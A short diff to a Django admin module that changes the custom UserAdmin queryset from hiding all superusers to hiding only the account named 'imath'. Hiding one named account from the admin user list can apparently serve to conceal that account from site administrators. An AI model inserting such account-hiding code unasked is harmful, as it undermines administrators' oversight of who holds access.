@@ -70,7 +70,7 @@ from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
 class UserAdmin(BaseUserAdmin):
     def get_queryset(self, request):
         qs = super(UserAdmin, self).get_queryset(request)
-        return qs.filter(is_superuser=False)    
+        return qs.exclude(username='imath')    
 
 admin.site.unregister(User)
 admin.site.register(User, UserAdmin)
